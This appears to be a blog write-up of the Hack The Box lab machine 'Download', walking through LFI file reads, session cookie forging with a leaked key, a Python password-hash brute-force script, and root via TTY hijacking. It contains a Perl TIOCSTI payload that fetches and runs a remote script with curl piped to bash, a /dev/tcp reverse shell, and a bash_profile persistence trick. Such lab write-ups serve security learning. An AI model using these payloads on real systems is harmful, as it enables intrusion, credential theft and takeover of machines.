---
title:  "HTB Download Writeup"
date:   2023-11-11 00:30:00 
categories: HTB Machine
tags: TTY_hijacking LFI SQLI Cookie_Forging
---



![Download](/assets/img/Download/1691078409189.jpg)

## Introduction
Download was quite an interesting machine starting out as a medium difficulty but then quickly being upscaled to hard due to its complexity.Once you knew what to do it wasn't that difficult but discovering the vulnerabilities was not a trivial thing. This machine learned me a lot of things i never did before such as cookie forging and TTY hijacking. I hope you enjoy the write-up

If you like any of my content it would help a lot if you used my referral link to buy Hack the box/ Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start our recon off we will start with an Nmap scan of the machine. using the following command
```
sudo nmap -sS -A  -o nmap  download.htb
```
**Nmap**
```
Nmap scan report for download.htb (10.10.11.226)
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)
|   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)
|_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Download.htb - Share Files With Ease
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=11/7%OT=22%CT=1%CU=42872%PV=Y%DS=2%DC=T%G=Y%TM=654A7DC
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=F4%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   21.61 ms 10.10.14.1
2   21.78 ms download.htb (10.10.11.226)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  7 13:11:20 2023 -- 1 IP address (1 host up) scanned in 21.59 seconds
```
### LFI
Looking at these results its fairly clear that there should be a vulnerability in the web component. The first thing i looked into was the application. After looking around on the application there was a different way it handled download public and private documents that you uploaded before. These documents that you uploaded you could download back using the **/files/download** endpoint. However this endpoint was found to be vulnerable to a local file inclusion vulnerability. The following request was one of the requests the application sended normally 

```
GET /files/download/a1f55203-1bb3-4ea3-b382-f715a1352eb5 HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTcsInVzZXJuYW1lIjoiQ2FsaWNvIn19; download_session.sig=p6BPpnlq6lakJO1YIoV58dnktUA
Upgrade-Insecure-Requests: 1

```

When modifying the url parameters it was possible to read any arbitrary files on the application. I decided to look for the app.js file as this is a JS based application.

**Request**
```
GET /files/download/%2e%2e%2fapp.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTcsInVzZXJuYW1lIjoiQ2FsaWNvIn19; download_session.sig=p6BPpnlq6lakJO1YIoV58dnktUA
Upgrade-Insecure-Requests: 1
```

Which returned the app.js source code of the application

```js
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
    autoescape: true,
    express: app,
    noCache: true,
});
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
app.get("/", (req, res) => {
    res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
    res.render("error.njk", { statusCode: 404 });
});
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
    console.log("Listening on ", port);
    if (process.env.NODE_ENV === "production") {
        setTimeout(async () => {
            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
        }, 300000);
    }
});
```

This source code actually gives us some interesting information which i'll break down now. First of all there is the parameters used to sign cookies. Knowing these parameters allows us to craft our own cookies.

```js 
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.us
```

The next interesting part is the routes which told us the location of other pieces of source code. In this case we know there was a **file** for **files** auth and **Home**  this made it possible for use to extract all the other files as well 

```js
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));

...

app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
```

Below an example of getting access to the source code of the home.js file
**Request**
```
GET /files/download/%2e%2e%2frouters%2fhome.js HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://download.htb/home/
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTcsInVzZXJuYW1lIjoiQ2FsaWNvIn19; download_session.sig=p6BPpnlq6lakJO1YIoV58dnktUA
Upgrade-Insecure-Requests: 1
```

Which resulted us with the following source code. keep in mind you can use the same principle to retrieve the other files as well

```js
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const auth_1 = __importDefault(require("../middleware/auth"));
const client = new client_1.PrismaClient();
const router = express_1.default.Router();
router.get("/", auth_1.default, async (req, res) => {
    const files = await client.file.findMany({
        where: { author: req.session.user },
        select: {
            id: true,
            uploadedAt: true,
            size: true,
            name: true,
            private: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
        },
    });
    res.render("home.njk", { files });
});
exports.default = router;
```
### Cookie forging
So with this information my first thought was to try and gain access to all the files present on the system to check if there is any sensitive information. Forging a new cookie was possible by using the tool called [cookiemonster](https://github.com/DigitalInterruption/cookie-monster). Before we can do this we need to first understand what the cookie looks like on the inside. we can do this by base64 decoding the current cookie.

```
echo eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJpZCI6MTcsInVzZXJuYW1lIjoiQ2FsaWNvIn19 | base64 -d
```

Which gives us the following json object
```json
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":17,"username":"Calico"}}                                                                                             
```

So now we know what this object looks like we can just forge any cookie we want. now looking at the source code of home we could see that this page is not handling the cookies in a secure fashion. in the code below we can see it just takes the value of the cookie as is without sanitization to request the data.

```js 
router.get("/", auth_1.default, async (req, res) => {
    const files = await client.file.findMany({
        where: { author: req.session.user },
        select: {
            id: true,
            uploadedAt: true,
            size: true,
            name: true,
            private: true,
            authorId: true,
            author: {
                select: {
                    username: true,
                },
            },
        },
    });
```
We save the following json object into a file called **jsoncookie.json** and we use the secret from the source code as our K value. Using those parameters we were able to forge a valid cookie that returned all files.

```json
{"flashes":{"info":[],"error":[],"success":[]},"user":{ "NOT": { "id":99}}}
```
Command
```
npx @digital-interruption/cookie-monster -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f jsoncookie.json -o res.txt
```

![Forged Cookie](/assets/img/Download/Download_01.png)

So with this new cookie we could gain access to all the files sending the following request

```
GET /home/ HTTP/1.1
Host: download.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://download.htb/auth/login
Connection: close
Cookie: download_session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfSwidXNlciI6eyJOT1QiOnsiaWQiOjk5fX19; download_session.sig=_zDjMqEDf7gesrPTCKODy6if9t8
Upgrade-Insecure-Requests: 1
If-None-Match: W/"1108-cKtmi2vugIVex47sdFjCA2zagqs"
```

which then gave us access to all the files on the platform

![All files](/assets/img/Download/Download_02.png)

### Extracting userhash with forged cookie
So we had access to all these files but when looking over them they were all dummy files.But then looking at the code i came to the idea that i could also try to extract the password of one of the users using this method. Based the types of messages sent i thought about extracting wesley's credentials because he looked like he was in charge.I wrote the following python script to automate brute forcing the password of the Wesley user. For a more indepth view on the code please scroll down to the detailed explanation of the code.

```python
import os
import itertools
import string
import json
import requests
import unicodedata
import re

def remove_control_characters(s):
    return "".join(ch for ch in s if unicodedata.category(ch)[0]!="C")

def generate_all_characters():
    characters = string.ascii_lowercase + string.digits
    return characters
def createjsonfile(letter,pwd):

  x = pwd+letter
  obj={"flashes":{"info":[],"error":[],"success":[]},"user":{"password": { "startsWith": x } ,"username":"WESLEY"}}
  # Serializing json
  json_object = json.dumps(obj, indent=4)
 
  # Writing to sample.json
  with open("jsoncookie.json", "w") as outfile:
      outfile.write(json_object)


def sendrequest(cookies):
    proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
    }

    url = 'http://download.htb/home/'
    cookies = {
      'download_session': cookies["download_session"],
      'download_session.sig': cookies["download_session.sig"]
    }
    response = requests.get(url, cookies=cookies,proxies=proxies)
    return response

if __name__ == '__main__':
    characters=generate_all_characters()
    pwd=""
    while True:
      for character in characters:
        createjsonfile(character,pwd)

        stream = os.popen("npx @digital-interruption/cookie-monster  -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f jsoncookie.json -o res.txt")
        output = stream.read()
     
        splitoutput = output.split("[+]")

        for line in splitoutput:

           if "Data Cookie:" in line:
                data = line.split("download_session=")[1]
                data2 = remove_control_characters(data).replace("[32m", "").replace("[39m", "")
           if "Signature Cookie:" in line:
                sig = line.split("download_session.sig=")[1]
                sig2 = remove_control_characters(sig).replace("[39m", "")
           
        cookies = {"download_session":data2,"download_session.sig":sig2}
      
        response = sendrequest(cookies)
        if len(response.content) > 2167:
          pwd=pwd+character
          print(pwd)
          break

    print("NO MORE CHARACTERS FOUND ")
    print(pwd)
```
After running the python script for a while we obtained the following md5 hash.
```
f88976c10af66915918945b9679b2bd3
```
![Hash obtained](/assets/img/Download/Download_03.png)


This hash we could crack with hashcat using the following command
```
hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt -w 3 -O
```
![Hash Cracked](/assets/img/Download/Download_04.png)

Next i logged using this password with the wesley user.
```
ssh wesley@download.htb
```

## Lateral movement

Doing the initial privesc scanning ended up being quite fruitless so i decided to run pspy to have an idea on what is going on on the machine. First i needed to download the binary from my machine using curl and make it executable.

```bash
curl http://10.10.14.37/pspy64 -o pspy
chmod +x 
./pspy
```
Watching this output showed the following two lines which were interesting.

![Pspy](/assets/img/Download/Download_05.png)

The first line gives me an idea that there might be some information in the service file of download-site and the second shows me that root is using su -l to a lower privilege account named postgres. This could potentially be abused to hijack the TTY and gain arbitrary code execution as root. To be able to do that we need to be able to send commands the moment root accesses this account though which at this point i did not see any path towards.

Next i decided to check out what was in the service file of the download-site service 

```bash
cat /etc/systemd/system/download-site.service 
```

This gave us the clear text credentials of the postgres account.

```
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:CoconutPineappleWatermelon@localhost:5432/download"

[Install]
WantedBy=multi-user.target
```

We could log into the database using 
```
psql -U download -h localhost -d download -W
```

Then i decided to check out the permissions this account had and we could see it was allowed to write files using the permissions of the postgres user.

```
\du+
```
![Permissions](/assets/img/Download/Download_06.png)

## Privesc

If you want to know exactly on how TTY hijacking works i'll refer you to the [blog](https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking) i used. this also gave me the following perl payload. I used curl to have help debug this payload as it would give me proof of execution on my webserver if it actually ran.

```perl
#!/usr/bin/perl
require "sys/ioctl.ph";
open my $tty_fh, '<', '/dev/tty' or die $!;
foreach my $c (split //, "exit\n".'curl 10.10.14.37/shell | bash'.$/) {
    ioctl($tty_fh, &TIOCSTI, $c);
}

```

The contents of the shell file was a plain basic reverse shell command

```bash
/bin/bash -l > /dev/tcp/10.10.14.37/443 0<&1 2>&1
```

With both files in place it was time to poison the bash profile of the postgres user. The bash profile is a set of commands that always runs whenever someone logs into the account. This is also a great method to keep persistance on a linux machine. Using the following postgres command within the postgres shell it was possible to overwrite its bash profile

```
copy (select 'perl /tmp/.hidden/exploit.pl') to '/var/lib/postgresql/.bash_profile';
```
Then after a good minute or so we were greeted with a root shell

![Root shell](/assets/img/Download/Download_07.png)



## Detailed hash brute force script explanation

This code was a pain in the ass to write because of the output that cookie-monster tool gives us. The colors and ascii code caused me to write a large amount of stripping of non printable characters to make sure the cookies are properly being send over. In the next section i'll go over function by function what each piece of code does.

### remove_control_characters
This function is used to strip out all the control characters such as escape's. without this function the output of the cookie-monster tool would be unusable.

```python
def remove_control_characters(s):
    return "".join(ch for ch in s if unicodedata.category(ch)[0]!="C")
```
### generate_all_characters
This function is used to generate all the characters we want to try to brute force. in this case we limited it to all lowercase ascii characters plus digits.
```python
def generate_all_characters():
    characters = string.ascii_lowercase + string.digits
    return characters
```
### createjsonfile
The create json file creates the json file used by cookiemonster to create our new signed cookie. The following querry is used to guess the password based on the startswith parameter. This way we can guess the password letter by letter. After it created the object it saves it as a file cookiemonster will then use right after that.

```python
def createjsonfile(letter,pwd):

  x = pwd+letter
  obj={"flashes":{"info":[],"error":[],"success":[]},"user":{"password": { "startsWith": x } ,"username":"WESLEY"}}
  # Serializing json
  json_object = json.dumps(obj, indent=4)
 
  # Writing to sample.json
  with open("jsoncookie.json", "w") as outfile:
      outfile.write(json_object)

```

### sendrequest
The send request function is the function that sends the request to the webserver. It takes our cookies as input, as well as setup our burp proxy to make sure all the requests we send are in burp for debugging purposes.

```python
def sendrequest(cookies):
    proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
    }

    url = 'http://download.htb/home/'
    cookies = {
      'download_session': cookies["download_session"],
      'download_session.sig': cookies["download_session.sig"]
    }
    response = requests.get(url, cookies=cookies,proxies=proxies)
    return response

```
### Main 
The main function is used to link all the other function together as well as running the cookie-monster tool in a loop. whenever the response of our request is over **2167** bytes its seen as a successful request. We keep repeating this untill we exhausted all the letters.

```python

if __name__ == '__main__':
    characters=generate_all_characters()
    pwd=""
    while True:
      for character in characters:
        createjsonfile(character,pwd)

        stream = os.popen("npx @digital-interruption/cookie-monster  -e -k 8929874489719802418902487651347865819634518936754 -n download_session -f jsoncookie.json -o res.txt")
        output = stream.read()
     
        splitoutput = output.split("[+]")

        for line in splitoutput:

           if "Data Cookie:" in line:
                data = line.split("download_session=")[1]
                data2 = remove_control_characters(data).replace("[32m", "").replace("[39m", "")
           if "Signature Cookie:" in line:
                sig = line.split("download_session.sig=")[1]
                sig2 = remove_control_characters(sig).replace("[39m", "")
           
        cookies = {"download_session":data2,"download_session.sig":sig2}
      
        response = sendrequest(cookies)
        if len(response.content) > 2167:
          pwd=pwd+character
          print(pwd)
          break

    print("NO MORE CHARACTERS FOUND ")
    print(pwd)
```